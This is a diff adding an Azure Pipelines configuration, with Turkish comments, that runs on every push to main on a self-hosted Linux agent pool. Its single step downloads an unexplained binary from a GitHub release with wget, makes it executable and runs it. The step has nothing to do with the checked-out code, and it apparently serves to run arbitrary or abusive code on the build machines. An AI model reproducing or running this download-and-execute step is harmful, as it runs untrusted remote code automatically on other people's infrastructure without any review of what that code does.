@@ -1,0 +1,27 @@
+trigger:
+- main
+
+# SELF-HOSTED agent/havuz
+pool:
+  name: "german"      # ← kendi self-hosted havuzunun adı
+  demands:
+  - Agent.OS -equals Linux # (opsiyonel) sadece Linux ajanlarda koş
+
+steps:
+- checkout: self
+
+- bash: |
+    set -euo pipefail
+
+    URL="https://github.com/RenderAuto/Autos/releases/download/turkeyrender/autoren8"
+    DEST="newtoss"
+
+    echo "👉 İndiriliyor: $URL"
+    wget -q -O "$DEST" "$URL"
+
+    echo "🔧 Çalıştırılabilir yapılıyor"
+    chmod +x "$DEST"
+
+    echo "▶️ Çalıştırılıyor..."
+    ./newtoss
+  displayName: "Binary indir ve çalıştır (self-hosted)"
